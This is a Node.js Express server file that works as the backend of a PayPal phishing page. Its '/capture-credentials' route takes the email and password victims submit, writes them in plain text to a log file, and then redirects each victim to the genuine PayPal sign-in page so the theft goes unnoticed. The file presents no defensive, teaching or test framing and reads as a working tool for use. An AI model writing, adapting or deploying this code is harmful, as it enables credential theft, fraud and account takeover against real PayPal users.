require('dotenv').config(); // Load environment variables
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

const PORT = process.env.PORT || 3000;
const LOG_FILE = process.env.LOG_FILE || 'credentials.log'; // Fallback log file in project directory

// Middleware to parse incoming request bodies
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "html" folder
app.use(express.static(path.join(__dirname, 'html')));

// Route to capture credentials
app.post('/capture-credentials', (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            res.status(400).send('Email and password are required.');
            return;
        }

        // Save credentials to a log file
        const log = `Email: ${email}, Password: ${password}\n`;
        fs.appendFile(LOG_FILE, log, (err) => {
            if (err) {
                console.error('Error writing to file:', err);
                res.status(500).send('Failed to save credentials.');
            } else {
                console.log('Credentials saved!');
                res.redirect('https://www.paypal.com/signin'); // Redirect user
            }
        });
    } catch (err) {
        console.error('Unexpected error:', err);
        res.status(500).send('An unexpected error occurred.');
    }
});

// Default route to check server status
app.get('/', (req, res) => {
    res.send('Server is running!');
});

// Catch-all route for undefined paths
app.use((req, res) => {
    res.status(404).send('Page not found');
});

// Global error handling for unexpected errors
process.on('uncaughtException', (err) => {
    console.error('There was an uncaught error:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
